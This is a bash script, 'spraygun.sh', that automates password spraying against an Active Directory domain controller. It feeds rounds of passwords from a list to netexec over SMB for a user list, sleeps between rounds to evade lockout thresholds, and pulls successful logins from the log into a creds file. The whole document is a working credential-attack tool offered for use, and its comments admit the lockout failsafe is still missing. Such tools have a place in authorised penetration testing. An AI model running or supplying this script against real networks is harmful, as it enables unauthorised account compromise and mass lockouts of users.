#!/bin/bash


#need to add locked-out accounts finding
#v0.4
#
## fixed iteration break
## added timer on screen
## fixed password parsing and displaying
## added spaces and delimeters for readability

#usage : ./spraygun.sh dc-ip userlist.txt passwords.txt sleep-in-mins passwords-per-round 

#script to auto-spray with cme
# going to add failsafe for account lockouts to wait for user confirmation before spraying the network and locking out all the users

# $1 - dc-ip
# $2 - user list
# $3 - password list
# $4 - sleep timer
# $5 - passwords per


#check for args
if [ $# -ne 5 ]; then
	echo 'Usage: spraygun.sh dc-ip users-list pass-list sleep-time-in-mins passwords-per-round'
	echo 'Example: ./spraygun.sh 10.10.10.10 users.txt passwords.txt 35 2'
	exit -1
fi

#pulling arg 4 into a var for timer() function
sleeping=$4 


#############################################
# timer func is used to display seconds onto the screen; being used to countdown for spray for more accurate tracking.
#############################################
timer()
{
secs=$(($sleeping * 60))
while [ $secs -gt 0 ]; do
   echo -ne "$secs\033[0K\r"
   sleep 1
   : $((secs--))
done
}

#used for sleeping the amount of time specified by user
sleep_timer="sleep $4m" 

# making files for moving passwords around
touch ./creds.txt 
touch ./used-passwords.txt
touch ./tmp-creds.txt
touch ./passwords-in-queue.txt 
touch ./tmp.txt

#starting the line count for the while loop
count=$(wc -l < $3)

# this could probably be just cat $3 > tmp.txt but I like to party
head -n $count $3 > passwords-in-queue.txt


# while loop to loop through passwords file, twice per loop
# going to try and add how many times per loop a user wants
while [ $count -gt 0 ]; do

	echo "Starting password spray with 2x every $4"
	
	# parses top two passwords from tmp.txt and sprays with netexec ; logs to spraygun-log.log	
	for pass in $(cat passwords-in-queue.txt | head -$5); do
		echo ''
		echo '############################'
		echo "Spraying: $pass"
		echo '############################'
		echo ''
		nxc smb $1 -u $2 -p $pass --continue-on-success --log spraygun-log.log
		echo $pass >> ./used-passwords.txt
		
		# sleep buffer because I like time
		sleep 5

	done
	
	# prints creds found to screen and to tmp-creds.txt ; then sorts uniquely and puts into creds.txt
	echo ''
	echo '############################'
	echo "Found creds: "
	cat spraygun-log.log | grep -ai '[+]' | awk -F " " '{print $11}' | tee -a tmp-creds.txt
	echo '############################'
 	sort -u tmp-creds.txt > creds.txt 
	echo "--Creds in creds.txt--"
	echo ''
	
	
	#removes top to lines from tmp.txt so the loop can start at the top of tmp.txt with two new passwords
	sed -i "1,$5d" passwords-in-queue.txt
	
	#updating count -- will be used to break out of loop cleanly when no more lines
	count=$(wc -l < passwords-in-queue.txt)
	
	# if loop to break out cleanly after end of file versus waiting until end of next loop
	if [ $count == 0 ]
	then
		break
	fi
	
	# sleep set up for time provided and countdown
	echo "sleeping for $4m"
	echo ''
	echo "Time until next spray (seconds): " 
	$sleep_timer & timer
	echo ''
	echo ''


done

echo "End of file, check your creds!"


